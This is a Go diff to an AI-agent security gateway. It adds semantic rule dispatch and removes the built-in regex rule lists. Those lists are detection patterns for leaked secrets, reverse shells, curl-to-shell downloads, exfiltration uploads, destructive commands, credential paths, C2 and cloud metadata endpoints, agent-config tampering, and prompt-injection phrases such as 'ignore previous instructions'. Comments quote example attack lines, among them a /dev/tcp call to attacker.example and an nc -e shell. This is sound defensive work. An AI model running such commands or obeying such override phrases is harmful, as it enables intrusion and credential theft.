@@ -17,6 +17,7 @@
 package gateway
 
 import (
+	"errors"
 	"fmt"
 	"os"
 	"regexp"
@@ -25,6 +26,7 @@ import (
 	"time"
 
 	"github.com/defenseclaw/defenseclaw/internal/guardrail"
+	"github.com/defenseclaw/defenseclaw/internal/guardrail/semantic"
 )
 
 // PatternRule is a single detection rule with a compiled regex, severity,
@@ -32,10 +34,15 @@ import (
 type PatternRule struct {
 	ID         string
 	Pattern    *regexp.Regexp
-	Title      string
-	Severity   string
-	Confidence float64
-	Tags       []string
+	Expression string
+	// ToolCallOnly keeps a rule's regex out of prompt, result, and artifact
+	// text scans. Expressions are always confined to the trusted dispatcher,
+	// which decides between Expression and Pattern for one owner.
+	ToolCallOnly bool
+	Title        string
+	Severity     string
+	Confidence   float64
+	Tags         []string
 }
 
 // RuleFinding is a structured finding produced by scanning tool args or content.
@@ -51,249 +58,25 @@ type RuleFinding struct {
 	// Empty for content-only matches; the emission pipeline then
 	// falls back to a rule-id-based capability (CapabilityForRuleID).
 	ToolCapabilityClass string `json:"tool_capability_class,omitempty"`
+	enforcement         findingEnforcement
+}
+
+type findingEnforcement uint8
+
+const (
+	// findingEnforcementInherit preserves the enforcement behavior of every
+	// finding produced before trusted semantic dispatch existed.
+	findingEnforcementInherit findingEnforcement = iota
+	findingEnforcementAllowed
+	findingEnforcementDetectionOnly
+)
+
+func (f RuleFinding) contributesToEnforcement() bool {
+	return f.enforcement != findingEnforcementDetectionOnly
 }
 
 // ---------------------------------------------------------------------------
-// Secret detection rules
-//
-// Modeled after the high-quality patterns in the TS plugin scanner (rules.ts).
-// Each pattern uses regex with structure/length validation to minimize false
-// positives. "sk-" alone is gone — it matches "desk-lamp".
-// ---------------------------------------------------------------------------
-
-var secretRules = []PatternRule{
-	{ID: "SEC-AWS-KEY", Pattern: regexp.MustCompile(`\b(?:AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[0-9A-Z]{16,}`), Title: "AWS access key", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"credential"}},
-	{ID: "SEC-AWS-SECRET", Pattern: regexp.MustCompile(`(?i)aws_secret_access_key\s*[=:]\s*[A-Za-z0-9/+=]{30,}`), Title: "AWS secret access key", Severity: "CRITICAL", Confidence: 0.90, Tags: []string{"credential"}},
-	{ID: "SEC-ANTHROPIC", Pattern: regexp.MustCompile(`sk-ant-[a-zA-Z0-9\-_]{20,}`), Title: "Anthropic API key", Severity: "CRITICAL", Confidence: 0.98, Tags: []string{"credential"}},
-	{ID: "SEC-OPENAI", Pattern: regexp.MustCompile(`sk-proj-[a-zA-Z0-9]{20,}`), Title: "OpenAI project key", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"credential"}},
-	{ID: "SEC-OPENAI-V2", Pattern: regexp.MustCompile(`sk-[a-zA-Z0-9]{40,}`), Title: "OpenAI API key (long form)", Severity: "CRITICAL", Confidence: 0.85, Tags: []string{"credential"}},
-	{ID: "SEC-STRIPE", Pattern: regexp.MustCompile(`(?:sk_live_|pk_live_|sk_test_|pk_test_|rk_live_|rk_test_)[a-zA-Z0-9]{20,}`), Title: "Stripe key", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"credential"}},
-	{ID: "SEC-GITHUB-TOKEN", Pattern: regexp.MustCompile(`(?:ghp_|gho_|ghu_|ghs_|ghr_)[a-zA-Z0-9]{36,}`), Title: "GitHub token", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"credential"}},
-	{ID: "SEC-GITHUB-PAT", Pattern: regexp.MustCompile(`github_pat_[a-zA-Z0-9_]{22,}`), Title: "GitHub fine-grained PAT", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"credential"}},
-	{ID: "SEC-GITLAB", Pattern: regexp.MustCompile(`glpat-[a-zA-Z0-9\-_]{20,}`), Title: "GitLab personal access token", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"credential"}},
-	{ID: "SEC-GOOGLE", Pattern: regexp.MustCompile(`AIza[0-9A-Za-z\-_]{35}`), Title: "Google API key", Severity: "CRITICAL", Confidence: 0.90, Tags: []string{"credential"}},
-	{ID: "SEC-SLACK-TOKEN", Pattern: regexp.MustCompile(`xox[bpors]-[0-9a-zA-Z\-]{10,}`), Title: "Slack token", Severity: "CRITICAL", Confidence: 0.90, Tags: []string{"credential"}},
-	{ID: "SEC-SLACK-WEBHOOK", Pattern: regexp.MustCompile(`https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[a-zA-Z0-9]+`), Title: "Slack webhook URL", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"credential"}},
-	{ID: "SEC-DISCORD-WEBHOOK", Pattern: regexp.MustCompile(`https://discord(?:app)?\.com/api/webhooks/\d+/[a-zA-Z0-9_\-]+`), Title: "Discord webhook URL", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"credential"}},
-	{ID: "SEC-PRIVKEY", Pattern: regexp.MustCompile(`-----BEGIN (?:RSA |EC |OPENSSH |PGP |DSA )?PRIVATE KEY-----`), Title: "Private key", Severity: "CRITICAL", Confidence: 0.98, Tags: []string{"credential"}},
-	{ID: "SEC-JWT", Pattern: regexp.MustCompile(`eyJ[A-Za-z0-9\-_]{10,}\.eyJ[A-Za-z0-9\-_]{10,}\.[A-Za-z0-9\-_.+/=]+`), Title: "JWT token", Severity: "MEDIUM", Confidence: 0.70, Tags: []string{"credential"}},
-	{ID: "SEC-CONNSTR", Pattern: regexp.MustCompile(`(?:mongodb|postgres|mysql|redis|amqp)://[^:\s]+:[^@\s]+@`), Title: "Connection string with credentials", Severity: "CRITICAL", Confidence: 0.90, Tags: []string{"credential"}},
-	{ID: "SEC-BEARER", Pattern: regexp.MustCompile(`(?i)(?:authorization|bearer)\s*[:=]\s*Bearer\s+[A-Za-z0-9\-_.~+/]+=*`), Title: "Bearer token in header", Severity: "HIGH", Confidence: 0.80, Tags: []string{"credential"}},
-	{ID: "SEC-SENDGRID", Pattern: regexp.MustCompile(`SG\.[a-zA-Z0-9\-_]{10,}\.[a-zA-Z0-9\-_]{10,}`), Title: "SendGrid API key", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"credential"}},
-	{ID: "SEC-TWILIO", Pattern: regexp.MustCompile(`SK[0-9a-fA-F]{32}`), Title: "Twilio API key", Severity: "HIGH", Confidence: 0.80, Tags: []string{"credential"}},
-	{ID: "SEC-NPM-TOKEN", Pattern: regexp.MustCompile(`npm_[a-zA-Z0-9]{36,}`), Title: "npm access token", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"credential"}},
-	{ID: "SEC-PYPI-TOKEN", Pattern: regexp.MustCompile(`pypi-[A-Za-z0-9\-_]{50,}`), Title: "PyPI API token", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"credential"}},
-	{ID: "SEC-HEX-SECRET", Pattern: regexp.MustCompile(`(?i)(?:secret(?:_key)?|api[_-]?key|access[_-]?token|auth[_-]?token)\s*[=:]\s*["'][a-f0-9]{32,}["']`), Title: "Hex-encoded secret in assignment", Severity: "HIGH", Confidence: 0.72, Tags: []string{"credential"}},
-}
-
-// ---------------------------------------------------------------------------
-// Command execution rules
-//
-// Detect dangerous shell commands in tool args. Regex-based with word
-// boundaries and syntax awareness. Replaces the old flat dangerousPatterns
-// substring list.
-// ---------------------------------------------------------------------------
-
-var commandRules = []PatternRule{
-	// Reverse shells and bind shells
-	{ID: "CMD-REVSHELL-BASH", Pattern: regexp.MustCompile(`(?i)bash\s+-i\s+>&\s*/dev/tcp/`), Title: "Bash reverse shell", Severity: "CRITICAL", Confidence: 0.98, Tags: []string{"execution", "reverse-shell"}},
-	// Closes avarice F-1729: bash /dev/tcp also accepts hostnames
-	// (e.g. exec 5<>/dev/tcp/attacker.example/4444). Match either a
-	// dotted-quad IPv4 prefix OR a non-empty hostname-shaped token
-	// followed by `/<port>`. Hostname branch demands at least one
-	// `.` to limit FPs against benign /dev/tcp/<service> fragments.
-	{ID: "CMD-REVSHELL-DEVTCP", Pattern: regexp.MustCompile(`/dev/tcp/(?:\d{1,3}\.\d{1,3}|[A-Za-z0-9-]+(?:\.[A-Za-z0-9-]+)+)/\d+\b`), Title: "Reverse shell via /dev/tcp", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"execution", "reverse-shell"}},
-	// Closes avarice F-1728: matches BOTH `-e`/`--exec` orderings:
-	//   destination-first:  nc 1.2.3.4 4444 -e /bin/sh
-	//   flag-first:         nc -e /bin/sh 1.2.3.4 4444
-	{ID: "CMD-REVSHELL-NC", Pattern: regexp.MustCompile(`(?i)\b(?:nc|ncat|netcat)\b\s+(?:(?:-[a-zA-Z]*\s+)*\S+\s+\d+\s*(?:-e|--exec)\b|(?:-[a-zA-Z]*\s+)*(?:-e|--exec)\s+\S+\s+\S+\s+\d+\b)`), Title: "Netcat reverse shell with -e", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"execution", "reverse-shell"}},
-	{ID: "CMD-REVSHELL-PYTHON", Pattern: regexp.MustCompile(`(?i)python[23]?\s+-c\s+.*socket.*connect`), Title: "Python reverse shell", Severity: "CRITICAL", Confidence: 0.90, Tags: []string{"execution", "reverse-shell"}},
-	// Piped execution — download and run
-	// Closes avarice F-1767: also match absolute shell paths like
-	// `/bin/sh`, `/bin/bash`, `/usr/bin/zsh`, plus the bare
-	// `sh`/`bash`/`zsh` forms. Mirrors policies/guardrail/{default,strict}/rules/commands.yaml.
-	{ID: "CMD-PIPE-CURL", Pattern: regexp.MustCompile(`(?i)\bcurl\b\s+[^|]*\|\s*(?:[/\w]+/)?(?:bash|zsh|sh)\b`), Title: "curl piped to shell", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"execution", "download-exec"}},
-	{ID: "CMD-PIPE-WGET", Pattern: regexp.MustCompile(`(?i)\bwget\b\s+[^|]*\|\s*(?:[/\w]+/)?(?:bash|zsh|sh)\b`), Title: "wget piped to shell", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"execution", "download-exec"}},
-	{ID: "CMD-PIPE-BASE64", Pattern: regexp.MustCompile(`(?i)base64\s+(?:-[dD]|--decode)\s*\|\s*(?:[/\w]+/)?(?:bash|zsh|sh)\b`), Title: "base64 decode piped to shell", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"execution", "obfuscation"}},
-	// Dynamic code execution
-	{ID: "CMD-EVAL", Pattern: regexp.MustCompile(`(?i)\beval\s+["'\$\(]`), Title: "Shell eval with dynamic input", Severity: "HIGH", Confidence: 0.85, Tags: []string{"execution"}},
-	{ID: "CMD-BASH-C", Pattern: regexp.MustCompile(`(?i)\b(?:ba)?sh\s+-c\s+`), Title: "Shell -c execution", Severity: "LOW", Confidence: 0.55, Tags: []string{"execution"}},
-	{ID: "CMD-PYTHON-C", Pattern: regexp.MustCompile(`(?i)\bpython[23]?\s+-c\s+`), Title: "Python inline execution", Severity: "LOW", Confidence: 0.55, Tags: []string{"execution"}},
-	{ID: "CMD-PERL-E", Pattern: regexp.MustCompile(`(?i)\bperl\s+-e\s+`), Title: "Perl inline execution", Severity: "LOW", Confidence: 0.55, Tags: []string{"execution"}},
-	{ID: "CMD-RUBY-E", Pattern: regexp.MustCompile(`(?i)\bruby\s+-e\s+`), Title: "Ruby inline execution", Severity: "LOW", Confidence: 0.55, Tags: []string{"execution"}},
-	// Destructive operations
-	{ID: "CMD-RM-RF", Pattern: regexp.MustCompile(`(?i)\brm\s+(?:-[a-zA-Z]*\s+)*(?:-[a-zA-Z]*)?(?:r[a-zA-Z]*f|f[a-zA-Z]*r)\b(?:\s+\S+)*\s+/(?:$|["'\s,}\]]|(?:etc|bin|sbin|usr|var|home|root|opt|boot|lib(?:64)?|srv|mnt|dev|proc|sys)(?:$|/|["'\s,}\]]))`), Title: "Recursive force delete from critical root path", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"destructive"}},
-	{ID: "CMD-MKFS", Pattern: regexp.MustCompile(`(?i)\bmkfs\b`), Title: "Filesystem format command", Severity: "CRITICAL", Confidence: 0.90, Tags: []string{"destructive"}},
-	{ID: "CMD-DD-IF", Pattern: regexp.MustCompile(`(?i)\bdd\s+if=`), Title: "dd disk write", Severity: "HIGH", Confidence: 0.80, Tags: []string{"destructive"}},
-	// Privilege escalation
-	{ID: "CMD-CHMOD-WORLD", Pattern: regexp.MustCompile(`(?i)\bchmod\s+[0-7]*[0-7][0-7][2367]\s`), Title: "chmod world-writable", Severity: "HIGH", Confidence: 0.80, Tags: []string{"privilege"}},
-	{ID: "CMD-CHOWN-ROOT", Pattern: regexp.MustCompile(`(?i)\bchown\s+root\b`), Title: "chown to root", Severity: "HIGH", Confidence: 0.75, Tags: []string{"privilege"}},
-	{ID: "CMD-SUDO", Pattern: regexp.MustCompile(`(?i)\bsudo\s+`), Title: "sudo invocation", Severity: "LOW", Confidence: 0.50, Tags: []string{"privilege"}},
-	// System file manipulation
-	{ID: "CMD-ETC-WRITE", Pattern: regexp.MustCompile(`(?i)>\s*/etc/`), Title: "Write redirect to /etc/", Severity: "CRITICAL", Confidence: 0.90, Tags: []string{"system-file"}},
-	{ID: "CMD-CRONTAB", Pattern: regexp.MustCompile(`(?i)\bcrontab\s+(?:-[a-zA-Z]\s+)*(?:-e|-r|-l|/|['"<>|])`), Title: "Crontab modification", Severity: "HIGH", Confidence: 0.75, Tags: []string{"persistence"}},
-	{ID: "CMD-SYSTEMCTL", Pattern: regexp.MustCompile(`(?i)\bsystemctl\s+enable\b(?:\s+--now\b)?\s+\S*(?:backdoor|payload|persist|reverse|shell|evil)\S*(?:\.service)?\b`), Title: "Suspicious systemd persistence enablement", Severity: "CRITICAL", Confidence: 0.82, Tags: []string{"persistence"}},
-	// Network reconnaissance
-	{ID: "CMD-NETCAT-LISTEN", Pattern: regexp.MustCompile(`(?i)\b(?:nc|ncat|netcat)\b\s+(?:-[a-zA-Z]*)*-?l`), Title: "Netcat listener", Severity: "HIGH", Confidence: 0.85, Tags: []string{"network", "reverse-shell"}},
-	{ID: "CMD-CURL-UPLOAD", Pattern: regexp.MustCompile(`(?i)\bcurl\b\s+.*(?:--upload-file|-T\s|--data\s+@|-F\s+.*=@)`), Title: "curl file upload", Severity: "HIGH", Confidence: 0.85, Tags: []string{"network", "exfiltration"}},
-	{ID: "CMD-WGET-POST", Pattern: regexp.MustCompile(`(?i)\bwget\b\s+.*--post-(?:data|file)`), Title: "wget POST data exfil", Severity: "HIGH", Confidence: 0.85, Tags: []string{"network", "exfiltration"}},
-	{ID: "CMD-SOCAT-EXEC", Pattern: regexp.MustCompile(`(?i)\bsocat\b\s+.*\bEXEC\b`), Title: "socat with EXEC (reverse shell)", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"execution", "reverse-shell"}},
-	{ID: "CMD-ENV-DUMP", Pattern: regexp.MustCompile(`(?i)(?:^|[^A-Za-z0-9_./-])(?:printenv\b|export\s+-p\b|env\s*[|>])`), Title: "Environment variable dump", Severity: "HIGH", Confidence: 0.80, Tags: []string{"credential"}},
-}
-
-// ---------------------------------------------------------------------------
-// Sensitive path rules
-//
-// Detect access to credential stores, config files, and sensitive directories.
-// Uses boundary matching to avoid false positives (e.g. "desktop-environment"
-// matching ".env").
-// ---------------------------------------------------------------------------
-
-// Every credential-file rule below shares the home-prefix sub-pattern
-// `(?:~|\$\{?HOME\}?|/home/\w+|/root|/Users/\w+)`. It matches `~`, the bare and
-// braced shell forms `$HOME` and `${HOME}`, Linux `/home/<user>` and `/root`,
-// and macOS `/Users/<user>`. The brace tolerance (`\{?...\}?`) is required
-// because the previous patterns missed `${HOME}/.aws/credentials` and
-// normalizeShell would strip the variable entirely, leaving only
-// `/.aws/credentials`, which also failed to match. The macOS `/Users/<user>`
-// branch is required because the run_command tool expands `~` via the shell
-// BEFORE the regex sees it, so on macOS the command line arrives as
-// /Users/<user>/.ssh/... rather than the literal ~/.ssh/... These compiled-in
-// defaults must stay in lockstep with the externalized packs under
-// policies/guardrail/<pack>/rules/sensitive-paths.yaml, which replace this
-// category once a rule pack is installed.
-var sensitivePathRules = []PatternRule{
-	{ID: "PATH-SSH-DIR", Pattern: regexp.MustCompile(`(?:~|\$\{?HOME\}?|/home/\w+|/root|/Users/\w+)/\.ssh/`), Title: "SSH directory access", Severity: "HIGH", Confidence: 0.95, Tags: []string{"credential", "file-sensitive"}},
-	{ID: "PATH-SSH-KEY", Pattern: regexp.MustCompile(`(?i)(?:^|[\\/])id_(?:rsa|ed25519|ecdsa|dsa)(?:$|[^A-Za-z0-9_.-])`), Title: "SSH private key file path", Severity: "CRITICAL", Confidence: 0.90, Tags: []string{"credential", "file-sensitive"}},
-	{ID: "PATH-AWS-CREDS", Pattern: regexp.MustCompile(`(?:~|\$\{?HOME\}?|/home/\w+|/root|/Users/\w+)/\.aws/credentials`), Title: "AWS credentials file", Severity: "CRITICAL", Confidence: 0.98, Tags: []string{"credential", "file-sensitive"}},
-	{ID: "PATH-AWS-CONFIG", Pattern: regexp.MustCompile(`(?:~|\$\{?HOME\}?|/home/\w+|/root|/Users/\w+)/\.aws/config`), Title: "AWS config file", Severity: "HIGH", Confidence: 0.85, Tags: []string{"credential", "file-sensitive"}},
-	{ID: "PATH-KUBE", Pattern: regexp.MustCompile(`(?:~|\$\{?HOME\}?|/home/\w+|/root|/Users/\w+)/\.kube/config`), Title: "Kubernetes config", Severity: "HIGH", Confidence: 0.90, Tags: []string{"credential", "file-sensitive"}},
-	{ID: "PATH-DOCKER", Pattern: regexp.MustCompile(`(?:~|\$\{?HOME\}?|/home/\w+|/root|/Users/\w+)/\.docker/config\.json`), Title: "Docker config", Severity: "HIGH", Confidence: 0.90, Tags: []string{"credential", "file-sensitive"}},
-	{ID: "PATH-GNUPG", Pattern: regexp.MustCompile(`(?:~|\$\{?HOME\}?|/home/\w+|/root|/Users/\w+)/\.gnupg/`), Title: "GPG keyring access", Severity: "HIGH", Confidence: 0.95, Tags: []string{"credential", "file-sensitive"}},
-	{ID: "PATH-NPMRC", Pattern: regexp.MustCompile(`(?:~|\$\{?HOME\}?|/home/\w+|/root|/Users/\w+)/\.npmrc`), Title: "npm config (may contain tokens)", Severity: "MEDIUM", Confidence: 0.80, Tags: []string{"credential", "file-sensitive"}},
-	{ID: "PATH-PYPIRC", Pattern: regexp.MustCompile(`(?:~|\$\{?HOME\}?|/home/\w+|/root|/Users/\w+)/\.pypirc`), Title: "PyPI config (may contain tokens)", Severity: "MEDIUM", Confidence: 0.80, Tags: []string{"credential", "file-sensitive"}},
-	{ID: "PATH-GIT-CREDS", Pattern: regexp.MustCompile(`(?:~|\$\{?HOME\}?|/home/\w+|/root|/Users/\w+)/\.git-credentials`), Title: "Git credentials file", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"credential", "file-sensitive"}},
-	{ID: "PATH-NETRC", Pattern: regexp.MustCompile(`(?:~|\$\{?HOME\}?|/home/\w+|/root|/Users/\w+)/\.netrc`), Title: "netrc credentials file", Severity: "CRITICAL", Confidence: 0.90, Tags: []string{"credential", "file-sensitive"}},
-	// `;` (shell command separator) is included in the suffix delimiter classes
-	// so `cat .env; true` also matches.
-	{ID: "PATH-ENV-FILE", Pattern: regexp.MustCompile(`(?:^|[\s/])\.env(?:\.(?:local|production|staging|development))?\s*["'\s,;\]})]*$|(?:^|[\s/])\.env(?:\.(?:local|production|staging|development))?["'\s,;\]})]`), Title: "Environment file", Severity: "HIGH", Confidence: 0.85, Tags: []string{"credential", "file-sensitive"}},
-	// The /etc/{passwd,shadow,sudoers} rules tolerate common obfuscations:
-	// canonical "/etc/passwd", space-separated "etc passwd", backslash
-	// "etc\passwd", spelled-out "etc slash passwd", and URL-encoded
-	// "etc%2Fpasswd". The narrow `/etc/passwd\b` pattern was trivially
-	// bypassed by prompts like "cat my etc passwd", which then had to
-	// rely entirely on the LLM Judge (itself capped at MEDIUM when only
-	// one injection category fires) — producing a silent pass-through.
-	// `pas{1,4}wd` also tolerates the common "passswd" typo (extra s)
-	// which LLMs happily resolve to /etc/passwd but strict spelling misses.
-	{ID: "PATH-ETC-PASSWD", Pattern: regexp.MustCompile(`(?i)(?:\betc[\s/\\]+(?:slash[\s]+)?pas{1,4}wd\b|\betc%2Fpas{1,4}wd\b)`), Title: "/etc/passwd access", Severity: "HIGH", Confidence: 0.85, Tags: []string{"system-file"}},
-	{ID: "PATH-ETC-SHADOW", Pattern: regexp.MustCompile(`(?i)(?:\betc[\s/\\]+(?:slash[\s]+)?shadow\b|\betc%2Fshadow\b)`), Title: "/etc/shadow access", Severity: "CRITICAL", Confidence: 0.90, Tags: []string{"system-file", "credential"}},
-	{ID: "PATH-ETC-SUDOERS", Pattern: regexp.MustCompile(`(?i)(?:\betc[\s/\\]+(?:slash[\s]+)?sudoers\b|\betc%2Fsudoers\b)`), Title: "/etc/sudoers access", Severity: "HIGH", Confidence: 0.85, Tags: []string{"system-file", "privilege"}},
-	{ID: "PATH-PROC-ENVIRON", Pattern: regexp.MustCompile(`/proc/(?:\d+|self)/environ`), Title: "/proc environ access", Severity: "CRITICAL", Confidence: 0.90, Tags: []string{"credential"}},
-	{ID: "PATH-HISTORY", Pattern: regexp.MustCompile(`(?:~|\$\{?HOME\}?|/home/\w+|/root|/Users/\w+)/\.(?:bash_history|zsh_history|python_history)`), Title: "Shell history file", Severity: "MEDIUM", Confidence: 0.80, Tags: []string{"credential", "file-sensitive"}},
-}
-
-// ---------------------------------------------------------------------------
-// C2 / exfiltration destination rules
-//
-// Detect known C2 services, cloud metadata endpoints, and DNS tunneling.
-// ---------------------------------------------------------------------------
-
-var c2Rules = []PatternRule{
-	// Known exfiltration services
-	{ID: "C2-WEBHOOK-SITE", Pattern: regexp.MustCompile(`(?i)webhook\.site`), Title: "webhook.site (known exfil)", Severity: "HIGH", Confidence: 0.90, Tags: []string{"exfiltration", "c2"}},
-	{ID: "C2-NGROK", Pattern: regexp.MustCompile(`(?i)(?:ngrok\.io|ngrok-free\.app)`), Title: "ngrok tunnel (exfil risk)", Severity: "HIGH", Confidence: 0.85, Tags: []string{"exfiltration", "c2"}},
-	{ID: "C2-PIPEDREAM", Pattern: regexp.MustCompile(`(?i)pipedream\.net`), Title: "Pipedream (known exfil)", Severity: "HIGH", Confidence: 0.90, Tags: []string{"exfiltration", "c2"}},
-	{ID: "C2-REQUESTBIN", Pattern: regexp.MustCompile(`(?i)requestbin\.com`), Title: "RequestBin (known exfil)", Severity: "HIGH", Confidence: 0.90, Tags: []string{"exfiltration", "c2"}},
-	{ID: "C2-HOOKBIN", Pattern: regexp.MustCompile(`(?i)hookbin\.com`), Title: "HookBin (known exfil)", Severity: "HIGH", Confidence: 0.90, Tags: []string{"exfiltration", "c2"}},
-	{ID: "C2-BURP", Pattern: regexp.MustCompile(`(?i)burpcollaborator\.net`), Title: "Burp Collaborator (pentest C2)", Severity: "HIGH", Confidence: 0.90, Tags: []string{"exfiltration", "c2"}},
-	{ID: "C2-INTERACTSH", Pattern: regexp.MustCompile(`(?i)interact\.sh`), Title: "interact.sh (OOB exfil)", Severity: "HIGH", Confidence: 0.90, Tags: []string{"exfiltration", "c2"}},
-	{ID: "C2-OAST", Pattern: regexp.MustCompile(`(?i)oast\.fun`), Title: "oast.fun (OOB testing)", Severity: "HIGH", Confidence: 0.85, Tags: []string{"exfiltration", "c2"}},
-	{ID: "C2-CANARY", Pattern: regexp.MustCompile(`(?i)canarytokens\.com`), Title: "Canary Tokens", Severity: "MEDIUM", Confidence: 0.75, Tags: []string{"exfiltration", "c2"}},
-	{ID: "C2-PASTEBIN", Pattern: regexp.MustCompile(`(?i)pastebin\.com/raw/`), Title: "Pastebin raw fetch", Severity: "MEDIUM", Confidence: 0.70, Tags: []string{"exfiltration", "c2"}},
-	// Cloud metadata endpoints (SSRF)
-	{ID: "C2-METADATA-AWS", Pattern: regexp.MustCompile(`169\.254\.169\.254`), Title: "AWS metadata endpoint (SSRF)", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"ssrf", "credential"}},
-	// Closes avarice F-1725: case-insensitive so uppercase DNS host
-	// variants (METADATA.GOOGLE.INTERNAL) cannot bypass the rule.
-	{ID: "C2-METADATA-GCP", Pattern: regexp.MustCompile(`(?i)metadata\.google\.internal`), Title: "GCP metadata endpoint (SSRF)", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"ssrf", "credential"}},
-	{ID: "C2-METADATA-AZURE", Pattern: regexp.MustCompile(`169\.254\.169\.254/metadata`), Title: "Azure metadata endpoint (SSRF)", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"ssrf", "credential"}},
-	{ID: "C2-METADATA-HEX", Pattern: regexp.MustCompile(`(?i)0xa9fea9fe`), Title: "AWS metadata endpoint (hex-encoded SSRF)", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"ssrf", "credential"}},
-	{ID: "C2-METADATA-DECIMAL", Pattern: regexp.MustCompile(`(?:^|[/])2852039166(?:$|[/])`), Title: "AWS metadata endpoint (decimal-encoded SSRF)", Severity: "CRITICAL", Confidence: 0.93, Tags: []string{"ssrf", "credential"}},
-	{ID: "C2-METADATA-OCTAL", Pattern: regexp.MustCompile(`0251\.0376\.0251\.0376`), Title: "AWS metadata endpoint (octal-encoded SSRF)", Severity: "CRITICAL", Confidence: 0.93, Tags: []string{"ssrf", "credential"}},
-	// DNS tunneling indicators
-	{ID: "C2-DNS-TUNNEL", Pattern: regexp.MustCompile(`(?i)\bdig\b\s+[^;\n]*\bTXT\b\s+(?:[a-f0-9]{16,}|[A-Za-z2-7]{24,})\.[A-Za-z0-9-]{2,}\.`), Title: "DNS TXT query with high-entropy label (tunneling indicator)", Severity: "HIGH", Confidence: 0.78, Tags: []string{"exfiltration", "dns-tunnel"}},
-	{ID: "C2-DNS-EXFIL", Pattern: regexp.MustCompile(`(?i)\bnslookup\b\s+[a-f0-9]{8,}\.\w+\.`), Title: "nslookup with hex subdomain (DNS exfil)", Severity: "HIGH", Confidence: 0.80, Tags: []string{"exfiltration", "dns-tunnel"}},
-}
-
-// ---------------------------------------------------------------------------
-// Cognitive file rules
-//
-// Detect tool args targeting agent identity and behavior files. A write to
-// SOUL.md is an identity takeover. Checked on ALL tools, not just write_file.
-// ---------------------------------------------------------------------------
-
-var cognitiveFileRules = []PatternRule{
-	{ID: "COG-SOUL", Pattern: regexp.MustCompile(`(?i)SOUL\.md`), Title: "SOUL.md access (agent identity)", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"cognitive-tampering"}},
-	{ID: "COG-IDENTITY", Pattern: regexp.MustCompile(`(?i)IDENTITY\.md`), Title: "IDENTITY.md access", Severity: "CRITICAL", Confidence: 0.95, Tags: []string{"cognitive-tampering"}},
-	{ID: "COG-MEMORY", Pattern: regexp.MustCompile(`(?i)MEMORY\.md`), Title: "MEMORY.md access", Severity: "HIGH", Confidence: 0.85, Tags: []string{"cognitive-tampering"}},
-	{ID: "COG-CLAUDE-MD", Pattern: regexp.MustCompile(`(?i)CLAUDE\.md`), Title: "CLAUDE.md access", Severity: "HIGH", Confidence: 0.85, Tags: []string{"cognitive-tampering"}},
-	{ID: "COG-TOOLS-MD", Pattern: regexp.MustCompile(`(?i)TOOLS\.md`), Title: "TOOLS.md access", Severity: "HIGH", Confidence: 0.80, Tags: []string{"cognitive-tampering"}},
-	{ID: "COG-AGENTS-MD", Pattern: regexp.MustCompile(`(?i)AGENTS\.md`), Title: "AGENTS.md access", Severity: "HIGH", Confidence: 0.80, Tags: []string{"cognitive-tampering"}},
-	{ID: "COG-OPENCLAW-JSON", Pattern: regexp.MustCompile(`(?i)openclaw\.json`), Title: "openclaw.json config access", Severity: "HIGH", Confidence: 0.80, Tags: []string{"cognitive-tampering"}},
-	{ID: "COG-GATEWAY-JSON", Pattern: regexp.MustCompile(`(?i)gateway\.json`), Title: "gateway.json config access", Severity: "HIGH", Confidence: 0.80, Tags: []string{"cognitive-tampering"}},
-}
-
-// ---------------------------------------------------------------------------
-// Trust exploitation / prompt injection rules
-//
-// Detect social engineering in tool args — authority claims, impersonation,
-// safety overrides. These catch attacks where the LLM is tricked into passing
-// injection payloads as tool arguments.
-// ---------------------------------------------------------------------------
-
-var trustExploitRules = []PatternRule{
-	{ID: "TRUST-AUTHORITY", Pattern: regexp.MustCompile(`(?i)(?:i am|i'm)\s+(?:your|the)\s+(?:creator|developer|admin|owner|operator)`), Title: "Authority claim in tool args", Severity: "HIGH", Confidence: 0.85, Tags: []string{"prompt-injection"}},
-	{ID: "TRUST-MAINTENANCE", Pattern: regexp.MustCompile(`(?i)(?:maintenance|debug|admin|developer)\s+mode\s+(?:enabled|activated|on)`), Title: "Fake mode activation", Severity: "HIGH", Confidence: 0.85, Tags: []string{"prompt-injection"}},
-	{ID: "TRUST-SAFETY-OVERRIDE", Pattern: regexp.MustCompile(`(?i)(?:safety|guardrail|filter|restriction)\s+(?:override|bypass|disable|turn\s+off|remove)`), Title: "Safety override attempt", Severity: "CRITICAL", Confidence: 0.90, Tags: []string{"prompt-injection"}},
-	{ID: "TRUST-NEW-INSTRUCTIONS", Pattern: regexp.MustCompile(`(?i)(?:your|new|updated)\s+(?:instructions|system\s+prompt|rules)\s+(?:have\s+changed|are|say)`), Title: "Fake instruction update", Severity: "HIGH", Confidence: 0.85, Tags: []string{"prompt-injection"}},
-	{ID: "TRUST-IGNORE-PREVIOUS", Pattern: regexp.MustCompile(`(?i)ignore\s+(?:all\s+)?(?:previous|prior|above|earlier)\s+(?:instructions|rules|guidelines|context)`), Title: "Ignore previous instructions", Severity: "CRITICAL", Confidence: 0.90, Tags: []string{"prompt-injection"}},
